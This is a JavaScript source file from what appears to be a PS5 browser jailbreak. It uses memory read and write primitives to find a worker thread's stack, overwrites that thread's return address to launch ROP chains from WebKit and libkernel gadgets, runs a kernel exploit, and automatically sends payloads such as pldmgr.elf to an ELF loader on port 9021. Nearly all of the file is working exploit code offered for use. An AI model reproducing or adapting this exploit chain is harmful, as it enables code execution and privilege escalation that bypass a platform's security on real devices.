function countFingerprints(p, stack, expected) {
  let count = 0;
  for (let offset = 0x7f000; offset < 0x80000; offset += 0x8) {
    const v = p.read8(stack.add32(offset));
    if (v.low === expected.low && v.hi === expected.hi) count++;
  }
  return count;
}

async function findWorkerStack(p, libKernelBase) {
  const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
  const PTHREAD_STACK_ADDR_OFFSET = 0xa8;
  const PTHREAD_STACK_SIZE_OFFSET = 0xb0;

  const plausible = (a) =>
    a.hi >= 0 && a.hi < 0x8000 && a.low >= 0x10000 && (a.low & 0x7) === 0;

  const head = libKernelBase.add32(OFFSET_lk__thread_list);

  // Collect every plausibility-gated 0x80000 stack.
  const stacks = [];
  let steps = 0;
  for (
    let thread = p.read8(head);
    thread.low != 0x0 && thread.hi != 0x0 && steps++ < 512;
  ) {
    if (!plausible(thread)) break;

    const next = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET));
    const stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
    const stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
    if (stacksz.hi === 0 && stacksz.low === 0x80000 && plausible(stack))
      stacks.push(stack);
    thread = next;
  }
  if (stacks.length === 0)
    throw new Error(`failed to find worker. (libkernel thread_list @ 0x${head.toString()}; scanned ${steps} thread nodes)`);

  // fingerprint-select. The rop_slave thread parks in the libkernel
  const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
  for (let attempt = 0; attempt < 50; attempt++) {
    const hits = stacks.filter((stack) =>
      countFingerprints(p, stack, expected) > 0,
    );
    if (hits.length === 1) return hits[0];
    if (hits.length === 0) {
      await new Promise((resolve) => setTimeout(resolve, 1));
      continue;
    }
    throw new Error(`worker-stack signature ambiguous: ${hits.length}/${stacks.length} plausible 0x80000 stacks are parked at kbase+${(OFFSET_lk_worker_wait_return >>> 0).toString(16)}`);
  }
  throw new Error(`no plausible 0x80000 stack parked at kbase+${(OFFSET_lk_worker_wait_return >>> 0).toString(16)} after retries (${stacks.length} candidates scanned)`);
}

async function findWorkerReturnSlot(p, stack, libKernelBase) {
  const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
  let lastCount = 0;

  for (let attempt = 0; attempt < 50; attempt++) {
    let hit = null;
    let count = 0;
    for (let offset = 0x7f000; offset < 0x80000; offset += 0x8) {
      const candidate = stack.add32(offset);
      const value = p.read8(candidate);
      if (value.low !== expected.low || value.hi !== expected.hi) continue;

      hit = candidate;
      count++;
    }
    if (count === 1) {
      return hit;
    }
    lastCount = count;
    await new Promise((resolve) => setTimeout(resolve, 1));
  }
  throw new Error(`worker wait return fingerprint count ${lastCount}, expected 1`);
}

function cstage(name, detail) {
  try {
    if (window.CrashLog) window.CrashLog.stage(name, detail);
  } catch (e) {}
}

function log(message, type = "log") {
  try {
    window.writeLog(message, type);
  } catch (e) {
    // If the module has not installed writeLog yet, still persist the line.
    try {
      if (window.CrashLog) window.CrashLog.info(String(message), type);
    } catch (e2) {}
  }
}

// ============================================================
// AUTO-LOAD: ya no se espera a pulsar R2.
// Se lanzan los payloads automaticamente con 2s de separacion.
// ============================================================

// Payload delivery bookkeeping, shared with the already-jailbroken path.
//
// "pending" is set the moment a delivery attempt starts and cleared only when
// every payload was handed to the loader. It lives in localStorage because the
// failure this guards against crosses process lifetimes: the webview can die
// mid-delivery (that is exactly the "kernel exploit pass but game not load"
// report), and the next launch must retry the handoff instead of assuming a
// previous run already installed the payloads. "ok" is the session-scoped fast
// path: a plain page reload after a *successful* delivery must not send
// pldmgr.elf a second time.
const PAYLOAD_PENDING_KEY = "ps5expweb_payload_pending";
const PAYLOAD_OK_KEY = "ps5expweb_payload_ok";

function readFlag(key) {
  try {
    return localStorage.getItem(key) === "1";
  } catch (e) {
    return false;
  }
}

function writeFlag(key, on) {
  try {
    if (on) localStorage.setItem(key, "1");
    else localStorage.removeItem(key);
  } catch (e) {}
}

function payloadDeliveryPending() {
  return readFlag(PAYLOAD_PENDING_KEY);
}

function payloadDeliveredThisSession() {
  try {
    return sessionStorage.getItem(PAYLOAD_OK_KEY) === "1";
  } catch (e) {
    return false;
  }
}

function markPayloadDelivered(ok) {
  try {
    if (ok) {
      sessionStorage.setItem(PAYLOAD_OK_KEY, "1");
      writeFlag(PAYLOAD_PENDING_KEY, false);
    } else {
      sessionStorage.removeItem(PAYLOAD_OK_KEY);
      writeFlag(PAYLOAD_PENDING_KEY, true);
    }
  } catch (e) {}
}

// Sends pldmgr.elf (and any configured extras) to the running elfldr.
// Returns { loaded, failed } or null when the loader could not be reached.
// A payload that never reaches the loader is a real failure: the caller must
// surface it, not report "ok" on a run whose game will not load.
async function autoLoadPayloads(p, chain) {
  writeFlag(PAYLOAD_PENDING_KEY, true);
  try {
    const { loadOptionalPayloads } = await import("./kexp.js");
    // Sends only the newest Payload Manager (pldmgr.elf v0.6.3). Payload
    // Manager installs and loads kstuff and shadowmountplus itself, so the web
    // host no longer streams those two ELFs over elfldr. This mirrors Y2JB
    // v1.0.3, whose unified autoloader starts Payload Manager and lets it own
    // the rest of the chain.
    const result = await loadOptionalPayloads(p, chain, (message) => log(message, "info"), {
      delayBetweenMs: 2000,
    });
    const loaded = (result && result.loaded) || [];
    const failed = (result && result.failed) || [];
    if (failed.length) {
      log("payloads loaded: " + (loaded.join(", ") || "none") + " | failed: " + failed.join(", "), "warn");
      cstage("main:payloads-partial", failed.join(","));
      markPayloadDelivered(false);
    } else {
      log("all payloads loaded: " + loaded.join(", "), "info");
      cstage("main:payloads-all", String(loaded.length));
      markPayloadDelivered(loaded.length > 0);
    }
    return { loaded: loaded, failed: failed };
  } catch (error) {
    const message = error instanceof Error ? error.message : String(error);
    log(message, "error");
    cstage("main:payloads-error", message);
    markPayloadDelivered(false);
    return null;
  }
}

const ROP_WAIT_MS = 20000;

function jbmark(tag, detail) {
  try {
    if (window.jb && typeof window.jb.mark === "function")
      window.jb.mark(tag, String(detail));
  } catch (e) {}
}

async function prepareRop(p) {
  const ctor = globalThis.__ps5NativeCtor;
  let webkitBase;
  if (typeof ctor === "number" && typeof OFFSET_wk_host_constructor_candidates !== "undefined") {
    for (const offset of OFFSET_wk_host_constructor_candidates) {
      const candidate = ctor - offset;
      if (candidate >= 0x800000000 && candidate < 0x900000000 && candidate % 0x4000 === 0) {
        webkitBase = candidate;
        break;
      }
    }
  }
  if (webkitBase === undefined)
    throw new Error("no host-constructor candidate gave a valid base (ctor=0x" + String(ctor) + ")");
  const libSceNKWebKitBase = new int64(webkitBase % 0x100000000,
    Math.floor(webkitBase / 0x100000000));

  let libSceLibcInternalBase = p.read8(
    libSceNKWebKitBase.add32(OFFSET_wk_memset_import),
  );
  libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);

  let libKernelBase = p.read8(
    libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import),
  );
  libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);

  const gadgets = {};
  const syscalls = {};

  for (const gadget in wk_gadgetmap) {
    gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
  }
  for (const sysc in syscall_map) {
    syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
  }

  const allocations = [];

  function malloc(size, type = 4) {
    const backing =
      type === 1
        ? new Uint8Array(1000 + size)
        : new Uint32Array(0x10000 + size);
    allocations.push(backing);

    const ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = backing;
    return ptr;
  }

  function stringify(str) {
    const bufView = new Uint8Array(str.length + 1);
    for (let i = 0; i < str.length; i++) {
      bufView[i] = str.charCodeAt(i) & 0xff;
    }

    const ptr = p.read8(p.leakval(bufView).add32(0x10));
    ptr.backing = bufView;
    return ptr;
  }

  function writestr(addr, str) {
    let waddr = addr.add32(0);
    if (typeof str == "string") {
      for (let i = 0; i < str.length; i++) {
        let byte = str.charCodeAt(i);
        if (byte == 0) {
          break;
        }
        p.write1(waddr, byte);
        waddr.add32inplace(0x1);
      }
    }
    p.write1(waddr, 0x0);
  }

  const worker = new Worker("./src/utils/rop_slave.js");

  async function waitForWorker() {
    return new Promise((resolve, reject) => {
      worker.onmessage = () => resolve();
      worker.onerror = () => reject(new Error("Worker failed to load"));
      worker.postMessage(0);
    });
  }

  jbmark("Worker", "waiting");
  await waitForWorker();
  jbmark("Worker", "ready");
  cstage("main:worker-ready");

  const workerStack = await findWorkerStack(p, libKernelBase);
  cstage("main:worker-stack");
  const originalContext = malloc(0x40);

  const returnAddress = await findWorkerReturnSlot(p, workerStack, libKernelBase);
  cstage("main:return-slot");
  const originalReturnAddress = p.read8(returnAddress);
  const stackPointerSlot = returnAddress.add32(0x8);

  function prepareChain(chain) {
    chain.push(gadgets["pop rdi"]);
    chain.push(originalContext);
    chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
  }

  async function launchChain(chain) {
    const originalStackPointer = p.read8(stackPointerSlot);
    chain.push_write8(originalContext, originalReturnAddress);
    chain.push_write8(originalContext.add32(0x10), returnAddress);
    chain.push_write8(stackPointerSlot, originalStackPointer);
    chain.push(gadgets["pop rdi"]);
    chain.push(originalContext);
    chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));

    p.write8(returnAddress, gadgets["pop rsp"]);
    p.write8(stackPointerSlot, chain.stack_entry_point);

    const completed = await new Promise((resolve) => {
      let settled = false;
      const finish = (value) => {
        if (settled) return;
        settled = true;
        resolve(value);
      };
      worker.onmessage = () => finish(true);
      setTimeout(() => finish(false), ROP_WAIT_MS);
      worker.postMessage(0);
    });

    if (!completed)
      throw new Error(`the rop worker never answered in ${ROP_WAIT_MS / 1000}s - refusing to continue on a chain that never ran. (Reload.)`);
  }

  const runtime = {
    write8: p.write8,
    write4: p.write4,
    write2: p.write2,
    write1: p.write1,
    read8: p.read8,
    read4: p.read4,
    read2: p.read2,
    read1: p.read1,
    leakval: p.leakval,
    pre_chain: prepareChain,
    launch_chain: launchChain,
    malloc,
    stringify,
    writestr,
    libSceLibcInternalBase,
    libKernelBase,
    syscalls,
    gadgets,
  };

  const chain = new worker_rop(runtime);

  const JB_POISON = new int64(0xdeadbeef, 0x00c0ffee);
  p.write8(chain.return_value, JB_POISON);
  cstage("main:rop-launch");
  const pid = await chain.syscall(SYS_GETPID);
  cstage("main:rop-chain", "pid=" + pid.low);
  if (pid.low == JB_POISON.low && pid.hi == JB_POISON.hi) {
    throw new Error("Worker chain did not execute; the return slot is unchanged.");
  }

  if (pid.low == 0) {
    throw new Error("WebKit exploit failed.");
  }
  jbmark("Worker chain", "ready");

  return { p: runtime, chain };
}

async function main(userlandRW) {
  cstage("main:prepare-rop");
  const { p, chain } = await prepareRop(userlandRW);
  cstage("main:rop-ready");
  const { runKernelExploit } = await import("./relapse_exploit.js");
  cstage("main:kernel-exploit");
  const result = await runKernelExploit(p, chain, log);
  cstage("main:kernel-result", result && result.done ? "done" : "stopped");
  // The second-boot guard fired: a previous chain is still up on 9021 and the
  // kernel is already patched. Re-arming it here is the double-patch that
  // panics the console. But "refuse to re-arm" must not mean "refuse to load
  // the game": if the previous delivery never finished (payloads pending), the
  // running elfldr is still waiting and this launch must hand it the payloads.
  // A reload after a *successful* delivery skips the resend so pldmgr.elf is
  // not installed twice.
  if (result && result.alreadyJailbroken) {
    log("already jailbroken: elfldr is up on port 9021, nothing to re-arm", "info");
    if (payloadDeliveryPending() && !payloadDeliveredThisSession()) {
      log("previous payload handoff did not finish - delivering to the running elfldr", "warn");
      cstage("main:payloads", "already-jailbroken-retry");
      const retry = await autoLoadPayloads(p, chain);
      const retryLoaded = (retry && retry.loaded) || [];
      const retryFailed = (retry && retry.failed) || [];
      if (!retry || retryFailed.length || retryLoaded.length === 0) {
        const detail = retryFailed.length ? " (failed: " + retryFailed.join(", ") + ")" : "";
        throw new Error(
          "payloads did not load on the already-jailbroken path" + detail +
          " - the game will not load; power-cycle the console and relaunch",
        );
      }
      log("payloads delivered to the running elfldr", "info");
      cstage("main:payloads-done");
      cstage("main:done", "already-jailbroken+payloads");
      return result;
    }
    cstage("main:done", "already-jailbroken");
    return result;
  }
  if (!result || !result.done)
    throw new Error("kernel exploit did not finish");

  if (result.payloads) {
    log("kernel exploit complete", "info");
    log("elfldr is listening on port 9021", "info");
    cstage("main:payloads");
    const delivery = await autoLoadPayloads(p, chain);
    const delivered = (delivery && delivery.loaded) || [];
    const failed = (delivery && delivery.failed) || [];
    cstage("main:payloads-done");
    // A run whose payloads never reached the loader is a failed run: the
    // kernel chain completed but the game cannot load. Throwing here lets
    // site.js mark the run failed, so the next launch's red banner names the
    // payload handoff instead of showing "ok" over a dead session.
    if (!delivery || failed.length || delivered.length === 0)
      throw new Error(
        "kernel exploit passed but the payloads did not load" +
        (failed.length ? " (failed: " + failed.join(", ") + ")" : "") +
        " - the game will not load",
      );
    log("payloads loaded: " + delivered.join(", "), "info");
  } else {
    // The chain escalated but the elfldr never confirmed up, so there is
    // nothing to hand the payloads to. That is a failed run for the user's
    // goal (loading a game), not a quiet success.
    throw new Error(
      "kernel chain completed but the elfldr did not come up - payloads cannot load",
    );
  }
  cstage("main:done");
}
